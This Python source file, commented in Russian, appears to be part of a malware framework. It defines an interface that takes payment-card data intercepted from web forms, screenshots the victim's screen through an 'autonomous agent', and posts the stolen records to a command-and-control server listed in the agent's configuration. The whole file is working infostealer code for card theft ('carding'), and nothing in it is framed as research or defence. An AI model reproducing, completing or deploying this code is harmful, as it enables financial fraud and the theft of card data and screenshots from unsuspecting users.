# Интерфейс взаимодействия carding_worker с агентом

from .carding_worker import CardingWorker
import requests # Для отправки логов на C2
import json
import logging
import base64 # Для фейкового скриншота
from typing import Optional, Tuple, TYPE_CHECKING

# Добавляем TYPE_CHECKING для агента
if TYPE_CHECKING:
    from src.autonomous_agent import AutonomousAgent

logger = logging.getLogger('CardingInterface')

class CardingWorkerInterface:
    C2_URL = "http://localhost:8000" # Заглушка, будет переопределена агентом

    def __init__(self, worker: CardingWorker, agent: 'AutonomousAgent'): # Принимаем ссылку на агента
        self.worker = worker
        self.agent = agent # Сохраняем ссылку на агента
        # Получаем ID и URL из агента
        self.agent_id = agent.agent_id or agent.agent_uuid # Используем ID или UUID
        self.C2_URL = agent.config.get('c2_servers', [self.C2_URL])[0]

    def on_form_intercepted(self, domain, data):
        logger.info(f"Form intercepted for {domain}")
        screenshot_bytes = self.request_screenshot(domain)
        self.worker.save_card_data(domain, data, screenshot_bytes)

    def on_screenshot(self, image_bytes):
        # Этот метод больше не нужен здесь, так как request_screenshot теперь синхронный (заглушка)
        pass

    def request_screenshot(self, context: str = "") -> Optional[bytes]:
        # Запрос скриншота у основного агента
        logger.debug(f"Requesting screenshot for context: {context}")
        try:
            # Вызываем метод агента для снятия скриншота
            # Агент возвращает base64, декодируем обратно в байты для сохранения
            screenshot_b64, error = self.agent._handle_screenshot() # Используем реализованный метод
            if error:
                logger.error(f"Agent failed to take screenshot: {error}")
                return None
            if screenshot_b64:
                return base64.b64decode(screenshot_b64)
            else:
                logger.warning("Agent returned empty screenshot.")
                return None
        except Exception as e:
            logger.error(f"Exception requesting screenshot from agent: {e}", exc_info=True)
            return None

    def send_to_c2(self, log_data: dict) -> bool:
        """Отправляет один лог на C2 сервер."""
        endpoint = f"{self.C2_URL}/api/v1/logs/carding/{self.agent_id}"
        try:
            response = requests.post(endpoint, json=log_data, timeout=15)
            response.raise_for_status() # Вызовет исключение для 4xx/5xx

            response_json = response.json()
            if response_json.get("status") == "success":
                logger.info(f"Successfully sent log ID {log_data.get('id', 'N/A')} to C2 for {log_data.get('domain')}")
                return True
            else:
                logger.warning(f"C2 returned non-success status for log ID {log_data.get('id', 'N/A')}: {response_json.get('message')}")
                return False
        except requests.exceptions.RequestException as e:
            logger.error(f"Failed to send log ID {log_data.get('id', 'N/A')} to C2 {endpoint}: {e}")
            return False
        except json.JSONDecodeError:
            logger.error(f"Failed to decode C2 response from {endpoint}. Status: {response.status_code}, Content: {response.text[:200]}...")
            return False
        except Exception as e:
            logger.error(f"Unexpected error sending log ID {log_data.get('id', 'N/A')} to C2: {e}")
            return False 